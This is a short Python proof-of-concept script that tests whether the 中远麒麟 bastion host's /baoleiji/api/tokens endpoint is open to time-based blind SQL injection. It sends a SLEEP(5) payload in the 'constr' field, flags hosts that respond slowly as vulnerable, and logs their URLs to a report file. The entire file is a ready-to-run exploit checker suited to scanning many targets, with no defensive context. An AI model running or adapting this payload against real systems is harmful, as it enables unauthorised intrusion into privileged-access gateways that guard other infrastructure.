import requests
import time
import buter
import wirtefile

filename = "./reps/中远麒麟堡垒机tokens_SQL注入-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded"
    }
poc = "/baoleiji/api/tokens"
data = '''constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND'AAdm'='AAdm&title=%40127.0.0.1'''

def zytokensSQL(url):
    try:
        start_time = time.time()
        reps = requests.post(url=url+poc, headers=headers,data=data, verify=False, timeout=10)
        end_time = time.time()
        el = end_time - start_time
        if el >= 5:
            print(buter.colors.GREEN+  f"存在中远麒麟堡垒机tokens_SQL注入 url : {url}" + buter.colors.END)
            reptext = reps.url
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现中远麒麟堡垒机tokens_SQL注入 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
